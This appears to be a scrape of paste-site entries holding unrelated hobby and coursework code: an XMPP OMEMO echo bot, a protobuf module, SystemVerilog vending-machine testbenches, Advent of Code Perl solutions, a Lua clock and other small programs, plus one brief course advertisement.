    parser.add_argument(""-q"", ""--quiet"", help=""set logging to ERROR"",
                        action=""store_const"", dest=""loglevel"",
                        const=logging.ERROR, default=logging.INFO)
    parser.add_argument(""-d"", ""--debug"", help=""set logging to DEBUG"",
                        action=""store_const"", dest=""loglevel"",
                        const=logging.DEBUG, default=logging.INFO)

    # JID and password options.
    parser.add_argument(""-j"", ""--jid"", dest=""jid"",
                        help=""JID to use"")
    parser.add_argument(""-p"", ""--password"", dest=""password"",
                        help=""password to use"")

    # Data dir for omemo plugin
    DATA_DIR = os.path.join(
        os.path.dirname(os.path.abspath(__file__)),
        'omemo',
    )
    parser.add_argument(""--data-dir"", dest=""data_dir"",
                        help=""data directory"", default=DATA_DIR)

    args = parser.parse_args()

    # Setup logging.
    logging.basicConfig(level=args.loglevel,
                        format='%(levelname)-8s %(message)s')

    if args.jid is None:
        args.jid = input(""Username: "")
    if args.password is None:
        args.password = getpass(""Password: "")

    # Setup the EchoBot and register plugins. Note that while plugins may
    # have interdependencies, the order in which you register them does
    # not matter.

    # Ensure OMEMO data dir is created
    os.makedirs(args.data_dir, exist_ok=True)

    xmpp = EchoBot(args.jid, args.password)
    xmpp.register_plugin('xep_0030') # Service Discovery
    xmpp.register_plugin('xep_0199') # XMPP Ping
    xmpp.register_plugin('xep_0380') # Explicit Message Encryption

    try:
        xmpp.register_plugin(
            'xep_0384',
            {
                'data_dir': args.data_dir,
            },
            module=slixmpp_omemo,
        ) # OMEMO
    except (PluginCouldNotLoad,):
        log.exception('And error occured when loading the omemo plugin.')
        sys.exit(1)

    # Connect to the XMPP server and start processing XMPP stanzas.
    xmpp.connect()
    xmpp.process()"
ePKwVXFU,whispertextprotocol_pb2.py,redchilis,Python,Sunday 17th of December 2023 08:50:08 AM CDT,"# -*- coding: utf-8 -*-
# Generated by the protocol buffer compiler.  DO NOT EDIT!
# source: WhisperTextProtocol.proto
""""""Generated protocol buffer code.""""""
from google.protobuf.internal import builder as _builder
from google.protobuf import descriptor as _descriptor
from google.protobuf import descriptor_pool as _descriptor_pool
from google.protobuf import symbol_database as _symbol_database
# @@protoc_insertion_point(imports)

_sym_db = _symbol_database.Default()




DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\x19WhisperTextProtocol.proto\""R\n\rSignalMessage\x12\x16\n\x0e\x64h_ratchet_key\x18\x01 \x01(\x0c\x12\t\n\x01n\x18\x02 \x01(\r\x12\n\n\x02pn\x18\x03 \x01(\r\x12\x12\n\nciphertext\x18\x04 \x01(\x0c\""\x7f\n\x13PreKeySignalMessage\x12\x17\n\x0fregistration_id\x18\x05 \x01(\r\x12\x0f\n\x07otpk_id\x18\x01 \x01(\r\x12\x0e\n\x06spk_id\x18\x06 \x01(\r\x12\n\n\x02\x65k\x18\x02 \x01(\x0c\x12\n\n\x02ik\x18\x03 \x01(\x0c\x12\x16\n\x0esignal_message\x18\x04 \x01(\x0c')

_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, globals())
_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, 'WhisperTextProtocol_pb2', globals())
if _descriptor._USE_C_DESCRIPTORS == False:

  DESCRIPTOR._options = None
  _SIGNALMESSAGE._serialized_start=29
  _SIGNALMESSAGE._serialized_end=111
  _PREKEYSIGNALMESSAGE._serialized_start=113
  _PREKEYSIGNALMESSAGE._serialized_end=240
# @@protoc_insertion_point(module_scope)"
fY35Ynq8,Untitled,saniainf,Python,Sunday 17th of December 2023 08:44:36 AM CDT,"def create_students(students):
    need_next_student = ""yes""
    print(""-----------Добавление студентов-----------"")
    while need_next_student == str.lower(""y"") or need_next_student == str.lower(""yes""):
        name = input(""Введите имя: "")
        if 0 < len(name) <= 2:
            print(""Имя должно быть больше 2 букв"")
            continue
        name = str.capitalize(name)
        age = int(input(""Введите возраст: ""))
        if age <= 0:
            print(""Возраст дожен быть больше нуля"")
            continue
        group = input(""Введите группу: "")
        student = {""name"": name, ""age"": age, ""group"": group}
        students.append(student)
        need_next_student = input(""Добавить студента? - Y/N "")


def print_student(student):
    name = student[""name""]
    age = student[""age""]
    group = student[""group""]
    print(f""| Имя:{name:>15s} | Возраст:{age:>15n} | Группа:{group:>15s} |"")


def print_students_from_group(students):
    print(""-----------Печать студентов из группы-----------"")
    group = input(""Введите группу: "")
    for student in students:
        if student[""group""] == group:
            print_student(student)


def print_students(students):
    print(""-----------Печать студентов-----------"")
    for student in students:
        print_student(student)


def delete_student(students):
    print(""-----------Удаление студента-----------"")
    name = str.lower(input(""Введите имя: ""))
    i = 0
    while i < len(students):
        if str.lower(students[i][""name""]) == name:
            students.pop(i)
            return
        i += 1


# students_list = [
#     {""name"": ""qwe"", ""age"": 12, ""group"": ""g1""},
#     {""name"": ""qwerty"", ""age"": 12, ""group"": ""g1""},
#     {""name"": ""asd"", ""age"": 14, ""group"": ""g2""},
#     {""name"": ""zxc"", ""age"": 16, ""group"": ""g3""},
# ]
students_list = []


def menu():
    choice = 1
    while choice != ""0"":
        print(""-----------Главное меню-----------"")
        print(""1. Добавить студента"")
        print(""2. Удалить студента"")
        print(""3. Вывести всех студентов"")
        print(""4. Вывести студентов группы"")
        print(""0. Выход"")
        choice = input("">"")
        if choice == ""1"":
            create_students(students_list)
        elif choice == ""2"":
            delete_student(students_list)
        elif choice == ""3"":
            print_students(students_list)
        elif choice == ""4"":
            print_students_from_group(students_list)
        else:
            continue


menu()
"
rh1mJuCQ,WordPress: Desactivar los feed y redireccionar a los usuarios a la entrada relacionada,YordanSoares,PHP,Sunday 17th of December 2023 08:14:54 AM CDT,"<?php
/**
 * WordPress:
 * Desactivar los feed en WordPress y redireccionar 
 * a los usuarios a la entrada relacionada con el feed consultado
 */
add_action( 'do_feed', 'desactivar_feed', 1 );
add_action( 'do_feed_rdf', 'desactivar_feed', 1 );
add_action( 'do_feed_rss', 'desactivar_feed', 1 );
add_action( 'do_feed_rss2', 'desactivar_feed', 1 );
add_action( 'do_feed_atom', 'desactivar_feed', 1 );
function desactivar_feed() {
    // Redirecciona a los usuarios a la entrada
    wp_redirect( get_permalink( $post->post_parent ) ); exit;
}"
sB1Dhd04,Problem 1 – Cafeteria,5kov,JavaScript,Sunday 17th of December 2023 08:11:41 AM CDT,"function cafeteria(array){
    let baristasArray = [];

    for (let index = 1; index <= parseInt(array[0]); index++) {
        let barista = {};
        barista['name'] = array[index].split(' ')[0];
        barista['shift'] = array[index].split(' ')[1];
        barista['drinks'] = array[index].split(' ')[2].split(',');
        baristasArray.push(barista);
    }

    for (let index = parseInt(array[0]) + 1; index < array.length; index++) {
        let commandArray = array[index].split(' / ');
        
        if (commandArray[0] === 'Closed') {
            break;
        } else if (commandArray[0] === 'Prepare') {
            for (let index = 0; index < baristasArray.length; index++) {
                if (baristasArray[index].name === commandArray[1]) {
                    if (baristasArray[index].shift === commandArray[2] && baristasArray[index].drinks.includes(commandArray[3])) {
                        console.log(baristasArray[index].name + ' has prepared a ' + commandArray[3] + ' for you!')
                    } else {
                        console.log(baristasArray[index].name + ' is not available to prepare a ' + commandArray[3] + '.')
                    }
                }
            }
        } else if (commandArray[0] === 'Change Shift') {
            for (let index = 0; index < baristasArray.length; index++) {
                if (baristasArray[index].name === commandArray[1]) {

                    baristasArray[index].shift = commandArray[2];
                    console.log(baristasArray[index].name + ' has updated his shift to: ' + commandArray[2])
                }    
            }

        } else if (commandArray[0] === 'Learn') {
            for (let index = 0; index < baristasArray.length; index++) {
                if (baristasArray[index].name === commandArray[1]) {
                    if (baristasArray[index].drinks.includes(commandArray[2])) {
                        console.log(baristasArray[index].name + ' knows how to make ' + commandArray[2] + '.');
                    } else {
                        baristasArray[index].drinks.push(commandArray[2]);
                        console.log(baristasArray[index].name + ' has learned a new coffee type: ' + commandArray[2] + '.');
                    }
                }
            }
        }
    }

    for (let index = 0; index < baristasArray.length; index++) {
        let name = baristasArray[index].name;
        let shift = baristasArray[index].shift;
        let drinks = baristasArray[index].drinks.join(', ');
        console.log('Barista: ' + name + ', Shift: ' + shift + ', Drinks: ' + drinks);        
    }
}

cafeteria([
    '3',
      'Alice day Espresso,Cappuccino',
      'Bob night Latte,Mocha',
      'Carol day Americano,Mocha',
      'Prepare / Alice / day / Espresso',
      'Change Shift / Bob / night',
      'Learn / Carol / Latte',
      'Learn / Bob / Latte',
      'Prepare / Bob / night / Latte',
      'Closed']
    );"
6D94p7fT,question_9,punjusquad,SystemVerilog,Sunday 17th of December 2023 07:46:46 AM CDT,"
///////////////////////////////////////////////////////////////

timeunit 1ns;
timeprecision 1ns;
class Transaction ;
rand bit n; // nickel
rand bit d; // dime
rand bit q; // quarter
constraint C1 { {n,d,q} dist {3'b100:=120, 3'b010:=50, 3'b001:=20};}
endclass: Transaction
////////////////////////////////////////////////////////////
class Generator;
Transaction trans;
mailbox drv_mb;
mailbox scb_mb;
function new (mailbox drv_mb, scb_mb);
this.drv_mb = drv_mb;
this.scb_mb = scb_mb;
endfunction
/////////////////////
task main (int count);
repeat (count) begin
trans = new();
if (!trans.randomize)
$fatal (0, ""<<<<---Randomization Failure--->>>"");
drv_mb.put(trans);
scb_mb.put(trans);
end//repeat
endtask
///////////////////
endclass:Generator
////////////////////////////////////////////////////////////
class Driver;
Transaction trans;
mailbox gen2drv;
virtual candy_if.TEST tb_port_h;
int nickels, dimes, quarters;
bit done;
function new (virtual candy_if.TEST tb_port_h, mailbox bb);
this.tb_port_h = tb_port_h;
gen2drv = bb;
endfunction
task reset();
tb_port_h.rst <= 0;
$display (""RESET started.. @%0t"",$time);
tb_port_h.n <= 0;
tb_port_h.d <= 0;
tb_port_h.q <= 0;
#12ns;
tb_port_h.rst <= 1; // de-assert reset...
$display (""RESET ended.. @%0t"",$time);
endtask
///////////////////////////
task drive(int count);
repeat (count) begin:loop
gen2drv.get(trans);
@(posedge tb_port_h.clk);
tb_port_h.n <= trans.n;
tb_port_h.d <= trans.d;
tb_port_h.q <= trans.q;
@(posedge tb_port_h.clk); // one clock duration pulse
tb_port_h.n <= 0;
tb_port_h.d <= 0;
tb_port_h.q <= 0;
if(tb_port_h.dispense)
repeat (20)@(posedge tb_port_h.clk);//for next set of coins..
nickels += trans.n;
dimes += trans.d;
quarters += trans.q;
end:loop
done = 1'b1; //mailbox emptied
//$display(""DRIVER::\tNICKELS = %0d, DIMES = %0d, QUARTERS = %0d\n"",nickels, dimes, quarters);
endtask
/////////////////////////////
endclass
////////////////////////////////////////////////////////////
class Scoreboard;
mailbox scb_mb;
Transaction trans;
nickels, dimes, quarters, num_candies;
int candy_cents, total_cents;
int rn, rd;
///////////////////////////
function new (mailbox scb_mb);
this.scb_mb = scb_mb;
endfunction
///////////////////////////
task compute(int count);
repeat (count) begin
scb_mb.get(trans);
nickels += trans.n;
dimes += trans.d;
quarters += trans.q;
candy_cents += 5*trans.n + 10*trans.d + 25*trans.q;
total_cents += 5*trans.n + 10*trans.d + 25*trans.q;
if(candy_cents >= 25) begin
num_candies++;
if(candy_cents==30) rn++;
else if (candy_cents ==35) rd++;
else if (candy_cents ==40) begin rd++;rn++; end
else if (candy_cents ==45) begin rd++;rd++; end
candy_cents = 0; // prepare for the next candy dispense...
end
end //repeat
endtask
///////////////////////////
task scb_display;
//$display(""SCOREBOARD:: TOTAL CENTS=%0d"",total_cents);
//$display(""SCOREBOARD:: NICKELS = %0d, DIMES = %0d, QUARTERS = %0d\n"",
//nickels, dimes, quarters);
$display(""SCOREBOARD:: CANDIES = %0d"", num_candies);
$display(""SCOREBOARD:: DIMES Returned = %0d"",rd);
$display(""SCOREBOARD:: NICKELS Returned = %0d\n"",rn);
endtask
endclass
////////////////////////////////////////////////////////////
class Monitor;
int num_candies, rn, rd;
virtual candy_if.MONITOR mon_port_h;
//////////////////////
function new(virtual candy_if.MONITOR aa);
mon_port_h = aa;
endfunction
//////////////////////
task collect_info;
@(negedge mon_port_h.clk);
if(mon_port_h.dispense) num_candies++;
if(mon_port_h.rd) rd++;
if(mon_port_h.rn) rn++;
endtask
//////////////////////
task mon_display;
$display (""MONITOR:: CANDIES = %0d"", num_candies);
$display (""MONITOR:: DIMES Returned = %0d"", rd);
$display (""MONITOR:: NICKELS returned = %0d\n"", rn);
endtask
//////////////////////
endclass
////////////////////////////////////////////////////////////
class Environment;
Generator gen;
mailbox gen_mb, scb_mb;
Driver drv;
Scoreboard scb;
Monitor mon;
bit fail;
// declare handles to the Interface for use by Driver and Monitor
virtual candy_if.TEST tb_port_h;
virtual candy_if.MONITOR mon_port_h;
//////////////////////
function new (virtual candy_if.TEST aa, virtual candy_if.MONITOR bb);
tb_port_h = aa;
mon_port_h = bb;
gen_mb = new(1);
scb_mb = new(1);
gen = new(gen_mb, scb_mb);
drv = new(tb_port_h, gen_mb);
scb = new(scb_mb);
mon = new(mon_port_h);
endfunction
/////////////////////
task run(int count);
pre_test();
test(count);
post_test();
endtask
////////////////////
task pre_test();
drv.reset;
repeat (5)
@(posedge tb_port_h.clk); // some arbitrary delay...
endtask
///////////////////
task test(count);
fork:fj1
gen.main(count);
drv.drive(count);
scb.compute(count);
while (!drv.done)
mon.collect_info();
join:fj1
endtask
//////////////////
task post_test();
scb.scb_display();
mon.mon_display();
if((scb.num_candies != mon.num_candies) || mon.num_candies ==0 )
fail = 1;
if((scb.rn != mon.rn) || mon.rn==0)
fail = 1;
if((scb.rd != mon.rd) || mon.rd==0)
fail = 1;
if(fail)
$display (""<<<<<----TEST FAILED --->>>>>>\n"");
else
$display (""!!! TEST PASSED !!!\n"");
endtask
//////////////////
endclass
////////////////////////////////////////////////////////////
interface candy_if (input bit clk);
logic rst;
logic n;
logic d;
logic q;
logic dispense;
logic rn;
logic rd;
///////////
modport DUT (
output dispense, rn ,rd,
input rst, n, d, q, clk
);
modport TEST (
input dispense, rn ,rd, clk,
output rst, n, d, q
);
modport MONITOR (
input dispense, rn, rd, clk
);
endinterface:candy_if
////////////////////////////////////////////////////////////
program automatic tb_candy_vending (tb_port, mon_port);
candy_if.TEST tb_port;
candy_if.MONITOR mon_port;
Environment env;
int rpt_count = 401;
bit fail;
// declare and initialize the interface handles..
virtual candy_if.TEST tb_port_h = tb_port;
virtual candy_if.MONITOR mon_port_h = mon_port;
// apply the inputs.....
initial begin
env = new (tb_port_h, mon_port_h);
env.run(rpt_count);
end 

 initial
    begin
        $recordfile(""candy_vending_ver3.trn"");
        $recordvars();
    end
endprogram
////////////////////////////////////////////////////////////
module top_candy_vending_ver4;
// generate the clock....
bit clk=1;
always #5 clk++;
// instantiate the interface..
candy_if IF1(
.clk(clk)
);
// instantiate the design unit...
candy_vending U2 (
.design_port(IF1.DUT)
);
// instantiate the program block
tb_candy_vending U1 (
.tb_port(IF1.TEST),
.mon_port(IF1.MONITOR)
);
endmodule
////////////////////////////////////////////////////////////
module candy_vending ( design_port);
candy_if.DUT design_port;
localparam [3:0] // for holding value of money deposited....
S0 = 4'b0000,
S5 = 4'b0001,
S10 = 4'b0010,
S15 = 4'b0011,
S20 = 4'b0100,
S25 = 4'b0101,
S30 = 4'b0110,
S35 = 4'b0111,
S40 = 4'b1000,
S45 = 4'b1001,
Sdd = 4'b1010, // dummy state...
SDD = 4'b1011; // dispense dime
reg [3:0] cst, nst; /// current and next states...
always_comb begin
nst = cst;
case (cst)
S0 :
if(design_port.n) nst = S5;
else if(design_port.d) nst = S10;
else if(design_port.q) nst = S25;
S5 :
if(design_port.n) nst = S10;
else if(design_port.d) nst = S15;
else if(design_port.q) nst = S30;
S10 :
if(design_port.n) nst = S15;
else if(design_port.d) nst = S20;
else if(design_port.q) nst = S35;
S15 :
if(design_port.n) nst = S20;
else if(design_port.d) nst = S25;
else if(design_port.q) nst = S40;
S20 :
if(design_port.n) nst = S25;
else if(design_port.d) nst = S30;
else if(design_port.q) nst = S45;
S25 , // in all these states candy is dispensed....
S30 ,
S35 ,
S40 ,
SDD : nst = S0;
S45 : nst = Sdd; // candy dispensed in S45
Sdd : nst = SDD; // Sdd is dummy state to separate out release of two dimes....
default: nst = S0;
endcase
end // begin
always_ff @(posedge design_port.clk or negedge design_port.rst) // sequential logic....
if(!design_port.rst)
cst <= S0;
else
cst <= nst;
assign design_port.dispense = (cst == S25)
| (cst == S30)
| (cst == S35)
| (cst == S40)
| (cst == S45);
assign design_port.rn = (cst == S30)
| (cst == S40);
assign design_port.rd = (cst == S35)
| (cst == S40)
| (cst == S45)
| (cst == SDD);
endmodule
///////////////////////////////////////////

"
e2j4NZNj,question_8,punjusquad,SystemVerilog,Sunday 17th of December 2023 07:45:02 AM CDT,"//interface to group signals

timeunit 1ns;
timeprecision 1ns;


interface candy_vending_intf(input bit clk);
logic rst;
logic n;
logic d;
logic q;
logic dispense;
logic rn;
logic rd;

modport DUT(
        input n,d,q,rst,clk,
        output dispense,rn,rd
);

modport TEST(
        input dispense,rn,rd,clk,
        output n,d,q,rst
);

endinterface:candy_vending_intf


class Transaction;
        rand bit n;
        rand bit d;
        rand bit q;

        constraint C1{{n,d,q} dist{3'b100:=120,3'b010:=50,3'b001:=20};}
endclass:Transaction

class Generator;
      //declare handles
      Transaction trans;
      mailbox drv_mb;//mailbox is an sv builtin unit

      //constructor function
      function  new(mailbox aa);
             drv_mb =aa;
      endfunction

      task main(int count);
	      repeat (count) begin
                trans= new();
		if(!trans.randomize)
			$fatal (0,""............Randomisation Failed!!!.........."");
		drv_mb.put(trans);
	      end
      endtask
endclass:Generator

class Driver;
      //declare handles
      Transaction trans;
      mailbox gen2drv;
      virtual candy_vending_intf.TEST h_tb_port;//h_tb_port is an handle to interface candy_vending_intf

      shortint nickels,dimes,quarters;
      bit done;

      function new(virtual candy_vending_intf.TEST h_tb_port, mailbox bb);
	      this.h_tb_port=h_tb_port;
	      gen2drv=bb;
      endfunction

      task reset();
	      @(posedge h_tb_port.clk);
	      h_tb_port.rst<=0;
	      $display(""REST Started...@%0t"",$time);
	      h_tb_port.n<=0;
	      h_tb_port.d<=0;
	      h_tb_port.q<=0;
	      #12ns;
	      h_tb_port.rst<=1;
	      $display(""RESET Ended...@%0t"",$time);
      endtask


      task drive(int count);
	      repeat (count) begin:loop
		      gen2drv.get(trans);
		      //count coins
		      nickels  += trans.n;
		      dimes    += trans.d;
		      quarters += trans.q;

		      @(posedge h_tb_port.clk);
		      h_tb_port.n<=trans.n;
		      h_tb_port.d<=trans.d;
		      h_tb_port.q<=trans.q;

		       @(posedge h_tb_port.clk);
		      h_tb_port.n<=0;
		      h_tb_port.d<=0;
		      h_tb_port.q<=0;

		      @(negedge h_tb_port.clk);
		      if(h_tb_port.dispense)
			      repeat (20) @(posedge h_tb_port.clk);
	      end:loop
	      done=1'b1; //all transactions done..

	      $display(""DRIVER::\t nickels =%0d, DIMES = %0d ,QUARTERS = %0d\n"",nickels,dimes,quarters);
      endtask          
endclass:Driver


program automatic tb_candy_vending(tb_port);
	candy_vending_intf.TEST tb_port;
	//declare all handles
	Transaction trans;
	mailbox     drv_mb;
	Generator   gen;
        Driver      drv;

	int  rpt_count=400;

	virtual candy_vending_intf.TEST h_tb_port=tb_port;//declare and initilaise theinterface handle
	//apply inputs	
	initial begin
         drv_mb=new(1);//depth-1
	 gen =new(drv_mb);
	 drv = new(h_tb_port,drv_mb);

	 drv.reset();//reset dut
	 repeat (5) @(posedge tb_port.clk);
	 fork:fj1
		 gen.main(rpt_count);
		 drv.drive(rpt_count);
	 join:fj1
 end
 initial
    begin
        $recordfile(""candy_vending_ver2.trn"");
        $recordvars();
    end

endprogram

        

module top_candy_vending_ver2;
bit clk;
initial
begin
        clk=1'b1;
        forever #5 clk++;
end

candy_vending_intf IF1(.clk(clk));


candy_vending_ver2 DES(
        .cv_ifc(IF1.DUT)
);


tb_candy_vending TESTBLK(
        .tb_port(IF1.TEST)
);
endmodule


module candy_vending_ver2(cv_ifc);
candy_vending_intf.DUT cv_ifc;

localparam[3:0]
    S0=0,
    S5=1,
    S10=2,
    S15=3,
    S20=4,
    S25=5,
    S30=6,
    S35=7,
    S40=8,
    S45=9,
    DUM=10,
    RD2=11;

reg[3:0] cst,nst;

always@(posedge cv_ifc.clk or negedge cv_ifc.rst)
begin
    if(!cv_ifc.rst)
        cst<=S0;
    else
        cst<=nst;
end

always@(*)
begin
    case(cst)
        S0:if(cv_ifc.n) nst=S5;
        else if(cv_ifc.d) nst=S10;
        else if(cv_ifc.q) nst=S25;
        else nst=cst;
        
        S5:if(cv_ifc.n) nst=S10;
        else if(cv_ifc.d) nst=S15;
        else if(cv_ifc.q) nst=S30;
        else nst=cst;
        
        S10:if(cv_ifc.n) nst=S15;
        else if(cv_ifc.d) nst=S20;
        else if(cv_ifc.q) nst=S35;
        else nst=cst;
        
        S15:if(cv_ifc.n) nst=S20;
        else if(cv_ifc.d) nst=S25;
        else if(cv_ifc.q) nst=S40;
        else nst=cst;
        
        S20:if(cv_ifc.n) nst=S25;
        else if(cv_ifc.d) nst=S30;
        else if(cv_ifc.q) nst=S45;
        else nst=cst;

        S25,S30,S35,S40,RD2:nst=S0;
        
        S45:nst=DUM;
        
        DUM:nst=RD2;
        
    endcase
end

assign cv_ifc.dispense=(cst==S25)|(cst==S30)|(cst==S35)|(cst==S40)|(cst==S45);

assign cv_ifc.rd=(cst==S35)|(cst==S40)|(cst==S45)|(cst==RD2); 

assign cv_ifc.rn=(cst==S30)|(cst==S40);

endmodule


"
wRrsxjFK,pr7_zaebalsya,J3st3rs_j0k3,C,Sunday 17th of December 2023 07:43:12 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

#define LOG_FILE ""/user/home/prg.log""

int hup_count = 0;

void sighup_handler(int signum) {
    hup_count++;
    FILE *file = fopen(LOG_FILE, ""a"");
    if (file == NULL) {
        perror(""Error opening file"");
        exit(EXIT_FAILURE);
    }
    fprintf(file, ""%d\n"", hup_count);
    fclose(file);
}

void sigusr1_handler(int signum) {
    FILE *file = fopen(LOG_FILE, ""r"");
    if (file == NULL) {
        perror(""Error opening file"");
        exit(EXIT_FAILURE);
    }
    int value;
    while (fscanf(file, ""%d"", &value) != EOF) {
        printf(""%d\n"", value);
    }
    fclose(file);
}

void sigterm_handler(int signum) {
    if (remove(LOG_FILE) == -1) {
        perror(""Error removing file"");
        exit(EXIT_FAILURE);
    }
    exit(EXIT_SUCCESS);
}

int main() {
    signal(SIGHUP, sighup_handler);
    signal(SIGUSR1, sigusr1_handler);
    signal(SIGTERM, sigterm_handler);
    while (1) {
        sleep(1);
    }
    return 0;
}"
pTvDGpqt,Untitled,sissou123,Python,Sunday 17th of December 2023 07:36:37 AM CDT,"Machine Learning A-Z: AI, Python & R + ChatGPT Prize [2023]
Learn to create Machine Learning Algorithms in Python and R from two Data Science experts. Code templates included.
for more:https://cuty.io/srIQP9shIY"
FbEAwJKA,"AoC 2023 day 17, part 2 (Perl)",musifter,Perl,Sunday 17th of December 2023 07:36:33 AM CDT,"#!/usr/bin/perl

use strict;
use warnings;

use feature         qw(say);
use Array::Heap::PriorityQueue::Numeric;

# Read in grid, adding sentinel 0s to right and bottom
my @Grid = map { chomp; [map {int} split(//), 0] } <>;
push( @Grid, [(0) x $Grid[0]->@*] );

my @Dirs = ([1,0], [0,1], [-1,0], [0,-1]);

my $EndY = $#Grid - 1;
my $EndX = $Grid[0]->$#* - 1;

sub print_grid  { say ""\t"", join( '', @$_ ) foreach (@Grid); }

my @visit;
my $queue = new Array::Heap::PriorityQueue::Numeric;
$queue->add( [0, 0, 0, 0], 0 );
$queue->add( [0, 0, 0, 1], 0 );

my $time = 0;

QUEUE:
while (my $state = $queue->get) {
    my ($cool, $y, $x, $dir) = @$state;

    if ($y == $EndY and $x == $EndX) {
        say ""\nPart 2: $cool"";
        last QUEUE;
    }

    print ::stderr ""[$time] Cooling: $cool ("", $queue->size(), "")  \r""  if (++$time % 100000 == 0);

    next QUEUE  if (defined $visit[$y][$x][$dir] and $cool >= $visit[$y][$x][$dir]);
    $visit[$y][$x][$dir] = $cool;

    foreach my $turn (($dir + 1) % 4, ($dir - 1) % 4) {
        my $new_y    = $y;
        my $new_x    = $x;
        my $new_cool = $cool;

        my $dist  = abs($new_y - $EndY) + abs($new_x - $EndX);
        my $delta = ($turn >= 2) ? 1 : -1;

        STEP:
        foreach my $steps (1 .. 10) {
            $new_y += $Dirs[$turn][0];
            $new_x += $Dirs[$turn][1];
            $dist += $delta;

            my $cooling = $Grid[$new_y][$new_x];
            last STEP if ($cooling == 0);

            $new_cool += $cooling;
            next STEP if ($steps < 4);

            $queue->add( [$new_cool, $new_y, $new_x, $turn], $new_cool + $dist );
        }
    }
}
"
x5rAZ9Wx,"AoC 2023 day 17, part 1 (Perl)",musifter,Perl,Sunday 17th of December 2023 07:35:10 AM CDT,"#!/usr/bin/perl

use strict;
use warnings;

use feature         qw(say);

use Array::Heap::PriorityQueue::Numeric;
use Math::Vector::Real;

my ($Y,$X) = Math::Vector::Real->canonical_base(2);
my @Dirs = ($Y, $X, -$Y, -$X);

# Read in grid, adding sentinel 0s to right and bottom
my @Grid = map { chomp; [map {int} split(//), 0] } <>;
push( @Grid, [(0) x $Grid[0]->@*] );
my $End = V($#Grid - 1, $Grid[0]->$#* - 1);

sub grid_at ($) { my $p = shift; return ($Grid[$p->[0]][$p->[1]]) }
sub print_grid  { say ""\t"", join( '', @$_ ) foreach (@Grid); }

my %visit;
my $queue = new Array::Heap::PriorityQueue::Numeric;
$queue->add( [0, V(0,0), 0], 0 );
$queue->add( [0, V(0,0), 1], 0 );

my $time = 0;

QUEUE:
while (my $state = $queue->get) {
    my ($cool, $pos, $dir) = @$state;

    if ($pos == $End) {
        say ""\nPart 1: $cool"";
        last QUEUE;
    }

    print ::stderr ""[$time] Cooling: $cool ("", $queue->size(), "")  \r""  if (++$time % 50000 == 0);

    next QUEUE  if (exists $visit{$pos,$dir} and $cool >= $visit{$pos,$dir});
    $visit{$pos,$dir} = $cool;

    foreach my $turn (($dir + 1) % 4, ($dir - 1) % 4) {
        my $new_pos  = $pos;
        my $new_cool = $cool;

        my $dist  = $pos->manhattan_dist($End);
        my $delta = ($turn >= 2) ? 1 : -1;

        STEP:
        foreach my $steps (1 .. 3) {
            $new_pos += $Dirs[$turn];
            $dist += $delta;

            my $cooling = grid_at( $new_pos );
            last STEP if ($cooling == 0);

            $new_cool += $cooling;
            next STEP if (exists $visit{$new_pos,$turn} and $new_cool >= $visit{$new_pos,$turn});

            $queue->add( [$new_cool, $new_pos, $turn], $new_cool + $dist );
        }
    }
}"
SwU41Xad,horloge paris v5.5,mickael49300_fr,Lua,Sunday 17th of December 2023 07:18:33 AM CDT,"-- Récupère l'heure et la date de Paris en temps réel
function getParisDateTime()
  local url = ""http://worldtimeapi.org/api/timezone/Europe/Paris""
  local response = http.get(url)
  local data = response.readAll()
  response.close()
  local time = textutils.unserializeJSON(data)
  local date = string.sub(time.datetime, 9, 10) .. ""/"" .. string.sub(time.datetime, 6, 7) .. ""/"" .. string.sub(time.datetime, 1, 4)
  local time = string.sub(time.datetime, 12, 19)
  return date, time
end

-- Fonction pour ajuster la taille d'affichage en fonction du nombre de moniteurs
function adjustDisplaySize(monitor)
  local size = #peripheral.getNames(""monitor"")
  if size == 0 then
    size = 1
  end
  monitor.setTextScale(math.floor(4 / size))
end

-- Initialise le moniteur
local monitor = peripheral.wrap(""top"")
adjustDisplaySize(monitor)
monitor.setTextColor(colors.white)

-- Boucle principale : affiche la date et l'heure de Paris en temps réel sur le moniteur sur la même ligne qui alterne toute les 5 seconde
while true do
  local date, time = getParisDateTime()
  local monitorWidth = monitor.getSize()
  local textWidth = string.len(time,date)
  local xPos = math.floor((monitorWidth - textWidth) / 2) + 1
  monitor.clear()
  monitor.setCursorPos(xPos, 1)
  monitor.write(time)
  sleep(1)
  local date, time = getParisDateTime()
  local monitorWidth = monitor.getSize()
  local textWidth = string.len(time,date)
  local xPos = math.floor((monitorWidth - textWidth) / 2) + 1
  monitor.clear()
  monitor.setCursorPos(xPos, 1)
  monitor.write(time)
  sleep(1)
  local date, time = getParisDateTime()
  local monitorWidth = monitor.getSize()
  local textWidth = string.len(time,date)
  local xPos = math.floor((monitorWidth - textWidth) / 2) + 1
  monitor.clear()
  monitor.setCursorPos(xPos, 1)
  monitor.write(time)
  sleep(1)
  local date, time = getParisDateTime()
  local monitorWidth = monitor.getSize()
  local textWidth = string.len(time,date)
  local xPos = math.floor((monitorWidth - textWidth) / 2) + 1
  monitor.clear()
 monitor.setCursorPos(xPos, 1)
  monitor.write(time)
  sleep(1)
  local date, time = getParisDateTime()
  local monitorWidth = monitor.getSize()
  local textWidth = string.len(time,date)
  local xPos = math.floor((monitorWidth - textWidth) / 2) + 1
  monitor.clear()
  monitor.setCursorPos(xPos, 1)
  monitor.write(time)
  sleep(1)
  local date, time = getParisDateTime()
  local monitorWidth = monitor.getSize()
  local textWidth = string.len(time,date)
  local xPos = math.floor((monitorWidth - textWidth) / 2) + 1
  monitor.clear()
  monitor.setCursorPos(xPos, 1)
  monitor.write(date)
  sleep(5)
end"
m8cER90i,Untitled,maksincolf,C++,Sunday 17th of December 2023 07:18:23 AM CDT,"#pragma once
// NOLINTBEGIN(cppcoreguidelines-pro-bounds-array-to-pointer-decay,hicpp-no-array-decay,bugprone-throw-keyword-missing)

#include <cassert>
#include <optional>
#include <stdexcept>
#include <system_error>
#include <utility>
#include <variant>

namespace tag {

constexpr inline struct Exception {
} kEx;

}  // namespace tag

template <class T>
class Try {
   public:
    Try() = default;

    explicit Try(const T& t) : val_opt_(t) {
    }

    explicit Try(T&& t) : val_opt_(std::move(t)) {
    }

    template <typename U>
    explicit Try(tag::Exception /*unused*/, U& e) : ex_opt_(std::make_exception_ptr(e)) {
    }

    template <
        typename U, typename = typename std::enable_if<!std::is_same_v<U, std::exception_ptr>>>
